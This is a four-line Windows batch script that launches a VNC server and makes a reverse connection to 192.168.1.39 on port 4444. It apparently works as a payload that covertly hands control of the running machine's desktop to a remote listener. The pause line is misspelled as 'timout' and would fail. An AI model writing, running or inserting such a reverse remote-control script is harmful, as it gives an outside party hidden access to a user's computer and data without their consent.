@echo off
start winvnc.exe -run
timout /t 1 >nul
winvnc.exe -connect 192.168.1.39::4444